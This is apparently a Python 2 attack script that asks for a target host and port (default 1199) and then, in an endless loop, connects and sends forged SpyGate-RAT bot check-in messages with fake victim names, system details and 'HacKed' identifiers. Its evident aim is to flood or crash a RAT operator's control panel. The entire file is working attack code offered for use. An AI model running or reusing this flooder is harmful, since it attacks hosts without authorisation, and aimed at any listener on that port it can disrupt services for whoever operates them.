import socket
#for attack host use Spy gate 
print """
this tool is create by Adel Ashraf
 you can change it if you know python :D
"""
c = "AW"
d = "|"
e = "UACODER"
log = 'SpyGate-RAT v 2.9OSAMA-UA'
log1 = 'OSAMA-UA'
info = "info|UACODER|HacKed_7E85C734|UACODER|ADEL-PC|UACODER|United States|UACODER|Win 7 Ultimate  SP1 x86|UACODER|adel|UACODER|No|UACODER|1.99 GB|UACODER|2.9 RC|UACODER|2014-06-01OSAMA-UA"
info1 = "info|UACODER|HacKed_7E85C734|UACODER|JOJO-PC|UACODER|United States|UACODER|Win 7 Ultimate  SP1 x86|UACODER|jojo|UACODER|No|UACODER|1.99 GB|UACODER|2.9 RC|UACODER|2014-06-01OSAMA-UA"
location = 'C:\\Windows\\system32\\cmd.exe - C:\\Users\\adel\\Desktop\\adel.pyOSAMA-UA'
buff1 = c + d + e + d +log1
buff2 = c + d + e + d + log
buff3 = c + d + e + d + location
a = raw_input("Write the host for craching : " )
print " the defalute port is 1199 "
b = int(raw_input("Write the port for connecting : " ))
while 1 :
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff1)
    print "data is : " ,repr(s.recv(100000))
    s.send(info)
    print "data is : " ,repr(s.recv(100000))
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff2)
    print "data is : " ,repr(s.recv(100000))
    s.send(info1)
    print "data is : " ,repr(s.recv(100000))
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff3)
    print "data is : " ,repr(s.recv(100000))
    s.send(info)
    print "data is : " ,repr(s.recv(100000))
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff1)
    print "data is : " ,repr(s.recv(100000))
    s.send(info1)
    print "data is : " ,repr(s.recv(100000))
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff2)
    print "data is : " ,repr(s.recv(100000))
    s.send(info)
    print "data is : " ,repr(s.recv(100000))
    s.close()
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(( a , b ))
    s.send(buff2)
    print "data is : " ,repr(s.recv(100000))
    s.send(info1)
    print "data is : " ,repr(s.recv(100000))
    s.close()
